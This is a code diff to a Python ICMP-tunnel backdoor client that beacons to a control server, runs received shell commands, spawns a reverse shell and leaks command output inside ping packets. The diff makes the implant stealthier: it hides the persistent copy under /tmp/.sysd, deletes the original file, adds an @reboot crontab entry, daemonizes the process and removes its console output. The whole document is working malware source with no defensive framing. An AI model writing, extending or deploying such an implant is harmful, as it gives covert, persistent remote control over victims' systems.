@@ -6,10 +6,10 @@ import os
 import subprocess
 import sys
 
-SERVER_IP = "192.168.108.137"  # IP addr of whatever the server script is running on, this one is from local testing
-INTERVAL = 5  # Ping interval
-CLIENT_ID = random.randint(1000, 9999)  # Unique ID per session
-PERSISTENT_PATH = "/tmp/.hidden_icmp_client" # TODO: change this so its masked, then use this for persistence
+SERVER_IP = "192.168.108.137" # IP addr of whatever the server script is running on, this one is from local testing
+INTERVAL = 5
+CLIENT_ID = random.randint(1000, 9999)
+PERSISTENT_PATH = "/tmp/.sysd"  # More masked name
 
 def checksum(data):
     """Calculate ICMP checksum for packet validity"""
@@ -24,7 +24,7 @@ def checksum(data):
 
 def create_icmp_packet(seq, payload):
     """Create an ICMP Echo Request packet with embedded payload data"""
-    icmp_type = 8  # Echo Request
+    icmp_type = 8
     icmp_code = 0
     identifier = CLIENT_ID
     checksum_placeholder = 0
@@ -38,7 +38,10 @@ def create_icmp_packet(seq, payload):
 def send_ping(sock, seq, message):
     """Send ICMP packet to server with embedded message"""
     packet = create_icmp_packet(seq, message)
-    sock.sendto(packet, (SERVER_IP, 1))
+    try:
+        sock.sendto(packet, (SERVER_IP, 1))
+    except Exception:
+        pass  # Ignore send errors and keep retrying
 
 def receive_reply(sock):
     """Wait for ICMP reply and extract message."""
@@ -47,9 +50,11 @@ def receive_reply(sock):
         if addr[0] == SERVER_IP:
             icmp_header = data[20:28]
             _type, _code, _checksum, _id, seq = struct.unpack("!BBHHH", icmp_header)
-            if _type == 0:  # Echo Reply
+            if _type == 0:
                 return data[28:].decode("utf-8", errors="ignore").strip()
     except socket.timeout:
+        return None
+    except Exception:
         return None
     return None
 
@@ -64,7 +69,7 @@ def execute_command(command):
     """Executes command, stripping unwanted text. Singular commands have the prefix of `CMD:`"""
     try:
         if command.startswith("CMD:"):
-            command = command[4:]  # Strip "CMD:" prefix
+            command = command[4:]
         process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         output, error = process.communicate()
         return (output + error).strip()
@@ -79,52 +84,76 @@ def send_command_output(sock, seq, output):
     chunks = [output[i:i+chunk_size] for i in range(0, len(output), chunk_size)]
     
     for i, chunk in enumerate(chunks):
-        # Add chunk indicator
         chunk_msg = f"[{i+1}/{len(chunks)}] {chunk}"
         send_ping(sock, seq + i, chunk_msg)
-        time.sleep(0.5)  # Small delay between chunks
+        time.sleep(0.5)
 
 def setup_persistence():
-    """Ensure persistence via crontab."""
+    """Ensure persistence via crontab. Creates a backup file at the persistent path"""
+    
+    # copy this file
     if not os.path.exists(PERSISTENT_PATH):
         os.system(f"cp {sys.argv[0]} {PERSISTENT_PATH}")
         os.system(f"chmod +x {PERSISTENT_PATH}")
+        os.system(f"cp {PERSISTENT_PATH} {PERSISTENT_PATH}.bak")
 
-    # TODO: add more layers of persistence, try and hide process/script?
+    # delete starting file
+    time.sleep(1)
+    if os.path.basename(sys.argv[0]) == "client.py":
+        os.unlink(sys.argv[0])  # Only delete if named client.py. This way the persistent file remains
+
+    # cron tab for rebooting
     cron_job = f"@reboot {PERSISTENT_PATH} &"
-    cron_file = "/tmp/cronjob"
+    cron_file = "/tmp/.cronjob"
     os.system(f"crontab -l 2>/dev/null | grep -v '{PERSISTENT_PATH}' > {cron_file}")
     with open(cron_file, "a") as f:
         f.write(cron_job + "\n")
     os.system(f"crontab {cron_file} && rm {cron_file}")
 
+def daemonize():
+    """Detach from terminal and hide process."""
+    try:
+        if os.fork() > 0:
+            sys.exit(0)  # Parent exits
+    except OSError:
+        sys.exit(1)
+
+    os.setsid()  # Create new session
+    if os.fork() > 0:
+        sys.exit(0)  # Second parent exits
+
+    sys.stdout.flush()
+    sys.stderr.flush()
+    
+    # Redirect std I/O to null
+    with open("/dev/null", "wb", 0) as devnull:
+        os.dup2(devnull.fileno(), sys.stdin.fileno())
+        os.dup2(devnull.fileno(), sys.stdout.fileno())
+        os.dup2(devnull.fileno(), sys.stderr.fileno())
+
 def main():
-    """Main beacon functionality. Calls the methods above and loops through to send a ping and wait for a response."""
+    """Main client functionality. Calls the methods above and loops through to send a ping and wait for a response."""
     setup_persistence()
+    daemonize()
+
     sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
     sock.settimeout(3)
     seq = 1
 
     while True:
-        send_ping(sock, seq, f"ALIVE:{CLIENT_ID}")  # Heartbeat with client ID
-        print(f"[+] Sent heartbeat (seq {seq}, ID {CLIENT_ID})")
-
+        send_ping(sock, seq, f"ALIVE:{CLIENT_ID}")  # Heartbeat
         response = receive_reply(sock)
-        if response:
-            print(f"[+] Command received: {response}")
 
+        if response:
             if response.lower() == "exit":
-                print("[!] Exiting...")
                 break
             elif response.lower() == "shell":
-                print("[!] Spawning reverse shell...")
                 reverse_shell()
                 send_ping(sock, seq + 1, "Shell spawned")
             elif response.startswith("CMD:"):
-                print(f"[!] Executing command: {response[4:]}")
                 output = execute_command(response)
                 send_command_output(sock, seq + 1, output)
-        
+
         seq += 1
         time.sleep(INTERVAL)
 
